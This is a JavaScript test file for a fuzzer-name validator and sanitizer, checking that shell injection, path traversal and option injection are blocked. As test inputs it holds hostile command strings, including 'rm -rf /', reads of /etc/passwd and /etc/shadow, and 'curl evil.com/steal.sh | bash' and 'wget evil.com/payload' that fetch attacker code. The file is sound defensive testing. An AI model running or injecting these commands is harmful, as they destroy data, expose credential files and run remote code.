/**
 * Tests for fuzzer name validation
 * These tests verify that fuzzer names are properly validated
 * to prevent shell injection and other security issues
 */

const assert = require("assert");
const {
  validateFuzzerName,
  sanitizeFuzzerName,
} = require("../../src/fuzzing/fuzzerUtils");

suite("Fuzzer Name Validation Tests", () => {
  suite("validateFuzzerName - Valid Names", () => {
    test("should accept simple alphanumeric names", () => {
      const result = validateFuzzerName("myfuzzer");
      assert.strictEqual(result.valid, true, "Simple name should be valid");
    });

    test("should accept names with hyphens", () => {
      const result = validateFuzzerName("my-fuzzer");
      assert.strictEqual(
        result.valid,
        true,
        "Name with hyphens should be valid",
      );
    });

    test("should accept names with underscores", () => {
      const result = validateFuzzerName("my_fuzzer");
      assert.strictEqual(
        result.valid,
        true,
        "Name with underscores should be valid",
      );
    });

    test("should accept names with numbers", () => {
      const result = validateFuzzerName("fuzzer123");
      assert.strictEqual(
        result.valid,
        true,
        "Name with numbers should be valid",
      );
    });

    test("should accept names with dots", () => {
      const result = validateFuzzerName("my.fuzzer");
      assert.strictEqual(result.valid, true, "Name with dots should be valid");
    });

    test("should accept names with colons (preset format)", () => {
      const result = validateFuzzerName("debug:my-fuzzer");
      assert.strictEqual(
        result.valid,
        true,
        "Name with colons (preset:fuzzer) should be valid",
      );
    });

    test("should accept names with forward slashes (path format)", () => {
      const result = validateFuzzerName("path/to/fuzzer");
      assert.strictEqual(
        result.valid,
        true,
        "Name with forward slashes should be valid",
      );
    });

    test("should accept complex valid names", () => {
      const result = validateFuzzerName("debug:my-fuzzer_v2.1/test");
      assert.strictEqual(
        result.valid,
        true,
        "Complex valid name should be accepted",
      );
    });

    test("should accept names up to 256 characters", () => {
      const longName = "a".repeat(256);
      const result = validateFuzzerName(longName);
      assert.strictEqual(
        result.valid,
        true,
        "Name with 256 characters should be valid",
      );
    });
  });

  suite("validateFuzzerName - Invalid Names", () => {
    test("should reject null or undefined", () => {
      const result1 = validateFuzzerName(null);
      assert.strictEqual(result1.valid, false, "null should be invalid");
      assert.ok(
        result1.error.includes("non-empty string"),
        "Should mention non-empty string requirement",
      );

      const result2 = validateFuzzerName(undefined);
      assert.strictEqual(result2.valid, false, "undefined should be invalid");
    });

    test("should reject empty string", () => {
      const result = validateFuzzerName("");
      assert.strictEqual(result.valid, false, "Empty string should be invalid");
      assert.ok(
        result.error.includes("non-empty string"),
        "Should mention non-empty string requirement",
      );
    });

    test("should reject whitespace-only names", () => {
      const result = validateFuzzerName("   ");
      assert.strictEqual(
        result.valid,
        false,
        "Whitespace-only should be invalid",
      );
      assert.ok(
        result.error.includes("whitespace only"),
        "Should mention whitespace-only rejection",
      );
    });

    test("should reject non-string types", () => {
      const result1 = validateFuzzerName(123);
      assert.strictEqual(result1.valid, false, "Number should be invalid");

      const result2 = validateFuzzerName({ name: "fuzzer" });
      assert.strictEqual(result2.valid, false, "Object should be invalid");

      const result3 = validateFuzzerName(["fuzzer"]);
      assert.strictEqual(result3.valid, false, "Array should be invalid");
    });

    test("should reject shell metacharacters - semicolon", () => {
      const result = validateFuzzerName("fuzzer; rm -rf /");
      assert.strictEqual(
        result.valid,
        false,
        "Name with semicolon should be invalid",
      );
      assert.ok(
        result.error.includes("Only alphanumeric"),
        "Should mention allowed characters",
      );
    });

    test("should reject shell metacharacters - pipe", () => {
      const result = validateFuzzerName("fuzzer | cat /etc/passwd");
      assert.strictEqual(
        result.valid,
        false,
        "Name with pipe should be invalid",
      );
    });

    test("should reject shell metacharacters - ampersand", () => {
      const result = validateFuzzerName("fuzzer & echo hacked");
      assert.strictEqual(
        result.valid,
        false,
        "Name with ampersand should be invalid",
      );
    });

    test("should reject shell metacharacters - dollar sign (variable)", () => {
      const result = validateFuzzerName("fuzzer$SHELL");
      assert.strictEqual(
        result.valid,
        false,
        "Name with dollar sign should be invalid",
      );
    });

    test("should reject shell metacharacters - backticks (command substitution)", () => {
      const result = validateFuzzerName("fuzzer`whoami`");
      assert.strictEqual(
        result.valid,
        false,
        "Name with backticks should be invalid",
      );
    });

    test("should reject shell metacharacters - quotes", () => {
      const result1 = validateFuzzerName('fuzzer"test');
      assert.strictEqual(
        result1.valid,
        false,
        "Name with double quotes should be invalid",
      );

      const result2 = validateFuzzerName("fuzzer'test");
      assert.strictEqual(
        result2.valid,
        false,
        "Name with single quotes should be invalid",
      );
    });

    test("should reject path traversal sequences", () => {
      const result = validateFuzzerName("../../../etc/passwd");
      assert.strictEqual(
        result.valid,
        false,
        "Name with path traversal should be invalid",
      );
      assert.ok(
        result.error.includes("Path traversal"),
        "Should mention path traversal",
      );
    });

    test("should reject names starting with hyphen", () => {
      const result = validateFuzzerName("-rm-fuzzer");
      assert.strictEqual(
        result.valid,
        false,
        "Name starting with hyphen should be invalid",
      );
      assert.ok(
        result.error.includes("cannot start with a hyphen"),
        "Should mention hyphen restriction",
      );
    });

    test("should reject names longer than 256 characters", () => {
      const longName = "a".repeat(257);
      const result = validateFuzzerName(longName);
      assert.strictEqual(
        result.valid,
        false,
        "Name longer than 256 characters should be invalid",
      );
      assert.ok(
        result.error.includes("too long"),
        "Should mention length restriction",
      );
    });

    test("should reject newline characters", () => {
      const result = validateFuzzerName("fuzzer\nrm -rf /");
      assert.strictEqual(
        result.valid,
        false,
        "Name with newline should be invalid",
      );
    });

    test("should reject carriage return characters", () => {
      const result = validateFuzzerName("fuzzer\recho hacked");
      assert.strictEqual(
        result.valid,
        false,
        "Name with carriage return should be invalid",
      );
    });

    test("should reject tab characters", () => {
      const result = validateFuzzerName("fuzzer\tcommand");
      assert.strictEqual(
        result.valid,
        false,
        "Name with tab should be invalid",
      );
    });

    test("should reject parentheses (subshell)", () => {
      const result = validateFuzzerName("fuzzer(echo hacked)");
      assert.strictEqual(
        result.valid,
        false,
        "Name with parentheses should be invalid",
      );
    });

    test("should reject braces (command grouping)", () => {
      const result = validateFuzzerName("fuzzer{a,b}");
      assert.strictEqual(
        result.valid,
        false,
        "Name with braces should be invalid",
      );
    });

    test("should reject angle brackets (redirection)", () => {
      const result1 = validateFuzzerName("fuzzer>output.txt");
      assert.strictEqual(result1.valid, false, "Name with > should be invalid");

      const result2 = validateFuzzerName("fuzzer<input.txt");
      assert.strictEqual(result2.valid, false, "Name with < should be invalid");
    });
  });

  suite("sanitizeFuzzerName", () => {
    test("should preserve valid names", () => {
      const result = sanitizeFuzzerName("my-fuzzer_v1.0");
      assert.strictEqual(
        result,
        "my-fuzzer_v1.0",
        "Valid name should be preserved",
      );
    });

    test("should replace shell metacharacters with underscores", () => {
      const result = sanitizeFuzzerName("fuzzer; rm -rf /");
      assert.strictEqual(
        result,
        "fuzzer__rm_-rf_/",
        "Shell metacharacters should be replaced (forward slash is allowed)",
      );
      assert.ok(!result.includes(";"), "Semicolon should be replaced");
    });

    test("should handle null gracefully", () => {
      const result = sanitizeFuzzerName(null);
      assert.strictEqual(result, "", "null should return empty string");
    });

    test("should handle undefined gracefully", () => {
      const result = sanitizeFuzzerName(undefined);
      assert.strictEqual(result, "", "undefined should return empty string");
    });

    test("should truncate to 256 characters", () => {
      const longName = "a".repeat(300);
      const result = sanitizeFuzzerName(longName);
      assert.strictEqual(
        result.length,
        256,
        "Should truncate to 256 characters",
      );
    });

    test("should replace all dangerous characters", () => {
      const dangerous = 'fuzzer";$(rm -rf /)&`whoami`|cat /etc/passwd';
      const result = sanitizeFuzzerName(dangerous);

      // Should not contain any of the dangerous characters
      const dangerousChars = [";", "$", "(", ")", "&", "`", "|", '"', "'"];
      for (const char of dangerousChars) {
        assert.ok(!result.includes(char), `Should not contain ${char}`);
      }
    });

    test("should preserve colons and forward slashes", () => {
      const result = sanitizeFuzzerName("debug:my/fuzzer");
      assert.strictEqual(
        result,
        "debug:my/fuzzer",
        "Colons and slashes should be preserved",
      );
    });

    test("should handle non-string types", () => {
      const result1 = sanitizeFuzzerName(123);
      assert.strictEqual(result1, "", "Number should return empty string");

      const result2 = sanitizeFuzzerName({ name: "fuzzer" });
      assert.strictEqual(result2, "", "Object should return empty string");
    });
  });

  suite("Integration - Real-world Attack Vectors", () => {
    test("should block command injection via semicolon", () => {
      const malicious = 'fuzzer"; rm -rf /home/user"';
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
    });

    test("should block command substitution via backticks", () => {
      const malicious = "fuzzer`curl evil.com/steal.sh | bash`";
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
    });

    test("should block command substitution via $(...)", () => {
      const malicious = "fuzzer$(wget evil.com/payload)";
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
    });

    test("should block environment variable access", () => {
      const malicious = "fuzzer$HOME";
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
    });

    test("should block file redirection", () => {
      const malicious = "fuzzer > /etc/passwd";
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
    });

    test("should block path traversal attacks", () => {
      const malicious = "../../../etc/shadow";
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes("Path traversal"));
    });

    test("should block option injection via leading hyphen", () => {
      const malicious = "--help";
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes("cannot start with a hyphen"));
    });

    test("should block null byte injection", () => {
      const malicious = "fuzzer\x00rm -rf /";
      const result = validateFuzzerName(malicious);
      assert.strictEqual(result.valid, false);
    });
  });
});
